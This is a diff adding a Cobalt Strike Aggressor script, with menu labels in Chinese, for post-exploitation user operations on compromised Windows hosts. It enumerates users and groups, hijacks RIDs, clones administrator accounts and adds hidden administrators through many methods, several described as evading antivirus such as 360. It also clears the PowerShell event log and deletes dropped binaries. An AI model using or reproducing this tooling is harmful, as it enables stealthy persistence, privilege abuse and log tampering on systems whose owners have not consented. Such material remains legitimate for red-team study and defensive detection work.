@@ -1,0 +1,388 @@
+menu "用户操作" {
+    @plugins = ls(script_resource("plugins/operate"));
+    foreach $plugin (@plugins) { 
+        include($plugin);
+    }
+
+	item "查询在线用户" {
+        local('$bid');
+        foreach $bid ($1) {
+        quser($bid);
+        }
+	}
+    sub quser {
+		btask($1, "Simple implementation of quser.exe using Windows API");
+        fireAlias($1, "quser", "");
+        # https://github.com/netero1010/Quser-BOF
+    }
+
+	item "删除指定用户" {
+        $exe = script_resource("bin/operate/NetUser.exe");
+        prompt_text("username：", "Adminlstrator", lambda({bexecute_assembly(@ids, $exe,"/del $1");}, @ids => $1));
+	}
+
+	menu "查询所有用户" {
+        item "REG" {
+            breg_queryv($1, "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names","",barch($bid));
+        }
+        item "BOF" {
+	        local('$bid');
+            foreach $bid ($1) {
+                userenum($bid);
+            }
+        }
+        sub userenum {
+            fireAlias($1, "userenum", "");
+        }
+        item "BNET" {
+            bnet($1, "user", "localhost", "");
+        }
+        item "Powerpick" {
+            bpowerpick($1, "net user");
+        }
+        item "NoPowerShell" {
+            btask($bid, "using NoPowerShell Execute Get-LocalUser aliases glu");
+            bexecute_assembly($1, script_resource("bin/auxiliary/NoPowerShell.exe"), "glu");
+        }
+    }
+
+	item "查询指定用户" {
+        $bid = $1['@'];
+        $dialog = dialog("Query Specify User",%(user => "Adminlstrator", type => "API", bid => $bid),&queryuser);
+        dialog_description($dialog, "使用API、BOF、BNET、Powerpick多种方式查询指定用户。");
+        drow_text($dialog, "user", "UserName: ");
+        drow_combobox($dialog, "type", "Option: ", @("API","BOF","BNET","Powerpick"));
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+	}
+
+    sub queryuser {
+        if ($3['type'] eq "API") {
+            $Parameter = "QueryUserInfo"."|".$3['user']."|1|1|1";
+            $dll = getFileProper(script_resource("bin/operate"), "reflective_dll.dll");
+            blog($bid,"$Parameter");
+            bdllspawn!($bid, $dll, $Parameter, "QueryUserInfo", 5000);
+            # prompt_text("username：", "Adminlstrator", lambda({bdllspawn!(@ids, $dll, "QueryUserInfo| $+ $1 $+ |1|1|1", "QueryUserInfo", 5000);}, @ids => $1));
+        }
+        if ($3['type'] eq "BOF") {
+            fireAlias($bid, "netuser", "$3['user']");
+        }
+        if ($3['type'] eq "BNET") {
+            bnet($bid, "user", "localhost", "$3['user']");
+        }
+        if ($3['type'] eq "Powerpick") {
+            bpowerpick($bid, "net user $3['user']");
+        }
+    }
+
+	menu "查询所有组名称" {
+        item "Powerpick" {
+            bpowerpick($1, "net localgroup");
+        }
+        item "NoPowerShell" {
+            btask($1, "using NoPowerShell Execute Get-LocalGroup aliases glg");
+            bexecute_assembly($1, script_resource("bin/auxiliary/NoPowerShell.exe"), "glg");
+        }
+	}
+
+	item "查询指定组成员" {
+        $bid = $1['@'];
+        $dialog = dialog("Query Specify Group Member",%(group => "Administrators", type => "API", bid => $bid),&querygroup);
+        dialog_description($dialog, "使用API、BOF、BNET、Powerpick、NoPowerShell等多种方式查询指定组下用户成员。");
+        drow_combobox($dialog, "group", "GroupName: ", @("Users","Guests","Administrators","Remote Desktop Users"));
+        drow_combobox($dialog, "type", "Option: ", @("API","BOF","BNET","Powerpick","NoPowerShell"));
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub querygroup {
+        if ($3['type'] eq "API") {
+			local('$Parameter $bid');
+			$bid = $3['bid'];
+			$Parameter = "GetGroupUsers"."|1|1|".$3['group']."|1";
+			blog($bid,"$Parameter");
+            bdllspawn!($bid, getFileProper(script_resource("bin/operate"), "reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
+        }
+        if ($3['type'] eq "BOF") {
+            fireAlias($bid, "netLocalGroupListMembers2", "\"$3['group']\"");
+        }
+        if ($3['type'] eq "BNET") {
+            bnet($bid, "localgroup", "localhost", "$3['group']");
+        }
+        if ($3['type'] eq "Powerpick") {
+            bpowerpick($bid, "net localgroup \"$3['group']\"");
+        }
+        if ($3['type'] eq "NoPowerShell") {
+            btask($bid, "using NoPowerShell Execute Get-LocalGroupMember aliases glgm");
+            bexecute_assembly($bid, script_resource("bin/auxiliary/NoPowerShell.exe"), "glgm \"$3['group']\" | Format-List -Property AccountType,Caption,LocalAccount,Disabled,Lockout,PasswordChangeable,PasswordExpires,PasswordRequired,SID");
+        }
+    }
+
+	menu "查看密码策略规则" {
+        item "NET" {
+            bshell($1, "net ACCOUNTS");
+        }
+        item "BOF" {
+            local('$bid');
+            foreach $bid ($1) {
+                get_password_policy($bid);
+            }
+        }
+	}
+    sub get_password_policy {
+        prompt_text("ip/hostname：", "127.0.0.1", lambda({fireAlias(@ids, "get_password_policy", "$1");}, @ids => $1));
+    }
+
+	item "获取所有用户目录" {
+		bexecute_assembly($1, script_resource("bin/recon/SharpCheckInfo.exe"), "-AllUserDirectories");
+	}
+
+    item "获取所有用户RID" {
+		bshell($1, "wmic useraccount get name,sid");
+	}
+
+	item "劫持管理用户RID" {
+        $bid = $1['@'];
+        $dialog = dialog("RID-Hijacking",%(rid => "500", user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&RIDHijacking);
+        dialog_description($dialog, "RID劫持适用于所有Windows版本，允许通过修改用户的某些安全属性以隐秘的方式为现有帐户设置所需的权限，从而欺骗被劫持的RID所有者权限！");
+        drow_text($dialog, "rid", "ridhijack: ");
+        drow_text($dialog, "user", "username: ");
+        drow_text($dialog, "pass", "password: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub RIDHijacking {
+      	bpowershell_import!($bid, script_resource("bin/operate/Invoke-RIDHijacking.ps1"));
+        bpowerpick($bid, "Invoke-RIDHijacking -User $3['user'] -RID $3['rid'] -Password $3['pass'] -Enable");
+        bshell($1,"wevtutil cl \"Windows PowerShell\"");
+        # https://github.com/r4wd3r/RID-Hijacking
+    }
+
+	item "克隆管理用户权限" {
+        $bid = $1['@'];
+        $dialog = dialog("Clone Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", cloneuser => "Administrator", bid => $bid),&cloneuser);
+        dialog_description($dialog, "Clone SAM NetUserAdd(10/2k8可添加用户)，但克隆SAM会被360拦，ShadowUser可不填password，默认为10位随机密码，请勿更改，可过360！");
+		drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+        drow_combobox($dialog, "method", "methods: ", @("UserClone","ShadowUser","Create-Clone"));
+        drow_text($dialog, "user", "username: ");
+        drow_text($dialog, "pass", "password: ");
+		drow_text($dialog, "cloneuser", "cloneuser: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub cloneuser {
+        if ($3['method'] eq "UserClone") {
+            bupload!($bid, script_resource("bin/operate/UserClone.exe"));
+            bshell($bid, "UserClone.exe $3['user'] $3['pass'] /add");
+		    bshell($bid, "UserClone.exe $3['user'] $3['cloneuser'] /clone");
+            bshell($bid, "del /f /s /q UserClone.exe");
+        } 
+        if ($3['method'] eq "ShadowUser") {
+            bexecute_assembly($bid, script_resource("bin/operate/ShadowUser.exe"),"$3['user'] $3['cloneuser']");
+        }
+        if ($3['method'] eq "Create-Clone") {
+            bpowershell_import!($bid, script_resource("bin/operate/Create-Clone.ps1"));
+            bpowerpick($bid, "Create-Clone -u $3['user'] -p $3['pass'] -cu $3['cloneuser']");
+            bshell($1,"wevtutil cl \"Windows PowerShell\"");
+        }
+    }
+
+	menu "绕过防护添加用户" {
+		item "BOF AddUser" {
+            $bid = $1['@'];
+            $dialog = dialog("Add Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&adduserbof);
+            dialog_description($dialog, "Cobalt Strike BOF that Add an admin user)");
+			drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub adduserbof {
+            btask($bid, "Task Beacon to run via AddUser-Bof");
+            fireAlias($bid, "adduser_bof", "$3['user'] $3['pass']");
+            # https://github.com/0x3rhy/AddUser-Bof
+        }
+
+		item "Bopin AddUser" {
+            $bid = $1['@'];
+            $dialog = dialog("User Management",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&add_localuser_b);
+            dialog_description($dialog, "Use Windows API NetUser (Add/Del/Change/Active)");
+			drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+			drow_combobox($dialog, "type", "options: ", @("add_user","delete_user","change_pass","active_user_yes","active_user_no"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub add_localuser_b {
+            $exe = script_resource("bin/operate/NetUser.exe");
+
+			if ($3['type'] eq "add_user") {
+				bexecute_assembly($bid, $exe,"/add $3['user'] $3['pass']");
+			}
+			if ($3['type'] eq "delete_user") {
+				bexecute_assembly($bid, $exe,"/del $3['user']");
+			}
+			if ($3['type'] eq "change_pass") {
+				bexecute_assembly($bid, $exe,"/change $3['user'] $3['pass']");
+			}
+			if ($3['type'] eq "active_user_yes") {
+				bexecute_assembly($bid, $exe,"/active $3['user'] yes");
+			}	
+			if ($3['type'] eq "active_user_no") {
+				bexecute_assembly($bid, $exe,"/active $3['user'] no");
+			}
+        }
+
+		item "Argue AddUser" {
+            $bid = $1['@'];
+            $dialog = dialog("Add Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&add_localuser_a);
+            dialog_description($dialog, "Use argue and run NetUserAdd(Cannot use shell and execute)");
+			drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub add_localuser_a {
+			bargue_add($bid, "net1", "/bypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypass");
+			brun($bid, "net1 user $3['user'] $3['pass'] /ad");
+			brun($bid, "net1 localgroup administrators $3['user'] /ad");
+            bargue_remove($bid, "net1");
+        }
+
+		item "VBScript AddUser" {
+            if (!-isadmin $1['@']) {
+                berror($1, "Run as administrator level!");
+                return;
+            } else {
+                bupload!($1, script_resource("bin/operate/adduser.vbs"));
+                bshell($1, "wscript adduser.vbs");
+                bshell($1, "del /f /s /q adduser.vbs");
+                btask($1, "User：Adminlstrator，Pass：P@ssw0rd!@#");
+            }
+        }
+
+		item "MS-SAMR AddUser" {
+            $bid = $1['@'];
+            $dialog = dialog("Add Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", group => "Administrators", bid => $bid),&add_localuser_m);
+            dialog_description($dialog, "通过samr将用户添加到localgroup中，groupName默认为Administrators，不要在AD中使用。");
+			drow_combobox($dialog, "version", "support: ", @("Win10/2012/2016"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+			drow_text($dialog, "group", "groupName: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub add_localuser_m {
+            btask($bid, "Task Beacon to run via MS-SAMR AddUser");
+            fireAlias($bid, "adduserbysamr", "$3['user'] $3['pass'] $3['group']");
+            # https://github.com/AgeloVito/adduserbysamr-bof
+        }
+
+        item "Powershell AddUser" {
+            $bid = $1['@'];
+            $dialog = dialog("Add Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&add_localuser_p);
+            dialog_description($dialog, "Use Powershell Bypass NetUserAdd， New-LocalUser only supports Windows 10/2016(≥Powershell 5.1)");
+			drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+            drow_combobox($dialog, "method", "methods: ", @("adduser.ps1","New-LocalUser"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub add_localuser_p {
+            if ($3['method'] eq "adduser.ps1") {
+                bpowershell_import!($bid, script_resource("bin/operate/adduser.ps1"));
+                bpowerpick($bid, "AddUser "."\"$3['user']\" "."\"$3['pass']\"");
+                bshell($1,"wevtutil cl \"Windows PowerShell\"");
+            } else {
+			    bshell($bid,"powershell New-LocalUser $3['user'] -Password (ConvertTo-SecureString -String $3['pass'] -AsPlainText -Force);Add-LocalGroupMember -Group administrators -Member $3['user']");
+            }
+        }
+
+        item "C# Directory AddUser" {
+            $bid = $1['@'];
+            $dialog = dialog("Add Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&add_localuser_c);
+            dialog_description($dialog, "C# Directory AddUser which can used be execute-assembly(*Recommand)");
+			drow_combobox($dialog, "version", "support: ", @("Win10/Win2k12/2016"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub add_localuser_c {
+            bexecute_assembly($bid, script_resource("bin/operate/DirectoryAddUser.exe"),"$3['user'] $3['pass']");
+        }
+
+        item "SelfBuild NetUserAdd" {
+            $bid = $1['@'];
+            $dialog = dialog("Add Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&add_localuser_s);
+            dialog_description($dialog, "SelfBuild：用户为禁用状态，AV一般不会监控账户启用而会监控账户禁用，因此还需要激活该用户和添加Administrators管理组。");
+			drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2016"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub add_localuser_s {
+            bupload!($bid, script_resource("bin/operate/SelfBuildAPIAddUser.exe"));
+            bshell($bid, "SelfBuildAPIAddUser.exe $3['user'] $3['pass']");
+			bshell($bid, "net localgroup administrators $3['user'] /add");  #添加管理组命令暂时还没拦
+            # bshell($bid, "net user $3['user'] /active:yes");  360已拦截该命令，改用NetUser激活
+            bexecute_assembly($bid, script_resource("bin/operate/NetUser.exe"),"/active $3['user'] yes");
+            bshell($bid, "del /f /s /q SelfBuildAPIAddUser.exe");
+        }
+
+        item "Reflection NetUserAdd" {
+            $bid = $1['@'];
+            $dialog = dialog("Add Administrator User",%(user => "Adminlstrator", pass => "P@ssw0rd!@#", bid => $bid),&add_localuser_r);
+            dialog_description($dialog, "Reflective NetUserAdd：用户为禁用状态，AV一般不会监控账户启用而会监控账户禁用，因此还需要激活该用户和添加Administrators管理组。");
+			drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+            drow_combobox($dialog, "type", "options: ", @("Reflection SelfBuild NetUserAdd","Reflection NetUserAdd[存在Bug!]"));
+            drow_text($dialog, "user", "username: ");
+            drow_text($dialog, "pass", "password: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub add_localuser_r {
+            if ($3['type'] eq "Reflection SelfBuild NetUserAdd") {
+                btask($bid, "Task Beacon to run via Reflection SelfBuild NetUserAdd");
+                bdllspawn($bid, script_resource("bin/operate/AddUser.x64.dll"), "$3['user'] $3['pass'] 2", "", 5000, false);
+                bexecute_assembly($bid, script_resource("bin/operate/NetUser.exe"),"/active $3['user'] yes");
+                # https://github.com/crisprss/BypassUserAdd
+            } else {
+                berror($bid, "暂时删掉，可以添加用户，但密码为[空密码]，可能因不允许空密码策略而无法登录！");
+                # bdllspawn($bid, script_resource("bin/operate/AddUser.x64.dll"), "$3['user'] $3['pass'] 1", "ReflectiveDll", 5000, false);
+			    # bshell($bid, "net localgroup administrators $3['user'] /add");
+                # bshell($bid, "net user $3['user'] /active:yes");
+            }
+        }
+	}
+
+    # Suborner BUG：不支持域控制器下使用；部分Win10、Win2k16系统创建用户密码为空，可能导致1分钟之后重启；windows7和server2012r2进行RDP连接失败等等，更多BUG自行测试。
+
+	item "无感创建隐藏用户[x]" {
+        $bid = $1['@'];
+        $dialog = dialog("Suborner-RID-Hijacking",%(user => "Admln", pass => "P@ssw0rd!@#", rid => "500", template => "500", bid => $bid),&suborner);
+        dialog_description($dialog, "只能在SYSTEM下执行，创建隐藏用户时没有调用Win32 API、也不会产生日志，machineaccount选项为yes时只需输入密码即可，不过无法用RDP登录，但可以用于横向渗透(明文/哈希)传递等。参考文章：https://r4wsec.com/notes/the_suborner_attack/index.html");
+        drow_combobox($dialog, "version", "support: ", @("Win10/11/Win2k16"));
+        drow_text($dialog, "user", "username[string]: ");
+        drow_text($dialog, "pass", "password[string]: ");
+        drow_text($dialog, "rid", "ridhijack[Default=500]: ");
+        drow_text($dialog, "template", "template[Default=500]: ");
+        drow_combobox($dialog, "machineaccount", "machineaccount[Default=yes]: ", @("no","yes"));
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub suborner {
+        berror($bid, "There is a bug in suborner!");
+        if ($3['machineaccount'] eq "no") {
+            # bexecute_assembly($bid, script_resource("bin/operate/Suborner64.exe"),"/username:$3['user'] /password:$3['pass'] /ridhijack:$3['rid'] /template:$3['template'] /machineaccount:$3['machineaccount']");
+            # https://github.com/r4wd3r/Suborner
+        } else {
+            # bexecute_assembly($bid, script_resource("bin/operate/Suborner64.exe"),"/password:$3['pass'] /ridhijack:$3['rid'] /template:$3['template'] /machineaccount:$3['machineaccount']");
+        }
+    }
+
+}
